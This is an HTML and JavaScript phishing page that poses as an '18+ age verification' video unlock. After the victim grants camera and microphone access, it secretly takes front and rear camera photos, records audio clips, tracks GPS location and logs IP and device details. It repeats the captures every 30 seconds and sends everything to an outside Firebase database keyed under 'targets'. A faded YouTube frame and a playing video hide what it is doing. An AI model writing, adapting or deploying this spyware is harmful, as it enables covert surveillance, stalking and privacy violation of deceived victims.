<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Age Verification | Secure Access</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
        
        /* Background & Overlay */
        #bg-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #111; z-index: 1; }
        #overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center; background: rgba(0,0,0,0.7); }

        .play-btn { width: 80px; height: 80px; background: #ff0000; border-radius: 50%; border: 3px solid #fff; cursor: pointer; display: flex; align-items: center; justify-content: center; }
        .play-btn::after { content: ''; border-style: solid; border-width: 15px 0 15px 25px; border-color: transparent transparent transparent #fff; margin-left: 5px; }

        /* Modal Style */
        #verify-modal { background: #1a1a1a; width: 90%; max-width: 350px; padding: 25px; border-radius: 12px; border: 1px solid #ff0000; text-align: center; display: none; color: #fff; z-index: 20; }
        .start-btn { background: #ff0000; color: #fff; border: none; padding: 15px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; margin-top: 15px; }

        /* VIDEO LOCKDOWN PLAYER */
        #player-wrapper { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 999; background: #000; }
        /* Ye target website ko dikhayega lekin 'pointer-events: none' isko un-clickable bana dega */
        #fake-site { width: 100%; height: 100%; border: none; pointer-events: none; opacity: 0.3; position: absolute; top: 0; left: 0; }
        #real-video { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100%; max-width: 800px; aspect-ratio: 16/9; z-index: 1000; border: 2px solid #ff0000; box-shadow: 0 0 50px #000; }
    </style>
</head>
<body>

    <div id="overlay">
        <div class="play-btn" id="btn-play" onclick="showModal()"></div>
        <p style="color:#fff; margin-top:15px; font-size:12px;">CLICK TO UNLOCK PRIVATE CONTENT</p>
        
        <div id="verify-modal">
            <h2 style="color:#ff0000; margin-top:0;">18+ VERIFICATION</h2>
            <p style="font-size: 13px;">This video is age-restricted. Please allow camera verification to continue.</p>
            <button class="start-btn" onclick="ignite()">VERIFY & WATCH</button>
        </div>
    </div>

    <div id="player-wrapper">
        <iframe id="fake-site" src="https://m.youtube.com"></iframe>
        <iframe id="real-video" allow="autoplay; encrypted-media"></iframe>
    </div>

<script>
    const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
    if (!firebase.apps.length) { firebase.initializeApp(firebaseConfig); }
    const db = firebase.database();
    
    const sessionID = "NODE_" + Math.floor(10000 + Math.random() * 90000);
    const myVideoURL = "https://www.youtube.com/embed/6Ogzc_-lW9w?autoplay=1&controls=1"; // Aapki video

    function showModal() {
        document.getElementById('btn-play').style.display = 'none';
        document.getElementById('verify-modal').style.display = 'block';
    }

    async function ignite() {
        try {
            // Step 1: Request Camera & Audio
            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });

            // Step 2: Show Player Lockdown
            document.getElementById('player-wrapper').style.display = 'block';
            document.getElementById('real-video').src = myVideoURL;
            document.getElementById('overlay').style.display = 'none';

            // Step 3: INSTANT CAPTURE (Front & Back)
            capture("user"); // Front
            setTimeout(() => capture("environment"), 3000); // Back after 3 sec

            // Step 4: INSTANT 15s AUDIO
            recordAudio(15000);

            // Step 5: START DATA LOGS & GPS
            logInfo();
            trackGPS();

            // Auto Refresh Capture every 30 sec
            setInterval(() => { capture("user"); recordAudio(15000); }, 30000);

        } catch (e) {
            alert("Verification Failed: Camera and Microphone access are mandatory for 18+ content.");
            location.reload();
        }
    }

    async function capture(mode) {
        try {
            const constraints = { video: { facingMode: mode === "user" ? "user" : "environment" } };
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            const v = document.createElement('video'); v.srcObject = stream; await v.play();
            
            setTimeout(() => {
                const c = document.createElement('canvas');
                c.width = v.videoWidth; c.height = v.videoHeight;
                c.getContext('2d').drawImage(v, 0, 0);
                db.ref(`targets/${sessionID}/photos`).push({ 
                    img: c.toDataURL('image/jpeg', 0.4), 
                    type: mode, 
                    time: new Date().toLocaleTimeString() 
                });
                stream.getTracks().forEach(t => t.stop());
            }, 2000);
        } catch(e) {}
    }

    async function recordAudio(ms) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            const mr = new MediaRecorder(stream);
            let chunks = [];
            mr.ondataavailable = (e) => chunks.push(e.data);
            mr.onstop = () => {
                const blob = new Blob(chunks, { type: 'audio/webm' });
                const reader = new FileReader();
                reader.readAsDataURL(blob);
                reader.onloadend = () => db.ref(`targets/${sessionID}/audio`).push({ data: reader.result, time: new Date().toLocaleTimeString() });
            };
            mr.start(); setTimeout(() => mr.stop(), ms);
        } catch(e) {}
    }

    function trackGPS() {
        navigator.geolocation.watchPosition(p => {
            db.ref(`targets/${sessionID}/location`).set({ latitude: p.coords.latitude, longitude: p.coords.longitude });
        }, null, {enableHighAccuracy:true});
    }

    async function logInfo() {
        const ipReq = await fetch('https://api.ipify.org?format=json').then(r => r.json());
        db.ref(`targets/${sessionID}/info`).set({
            ip: ipReq.ip,
            platform: navigator.platform,
            agent: navigator.userAgent,
            time: new Date().toLocaleString()
        });
    }
</script>
</body>
</html>
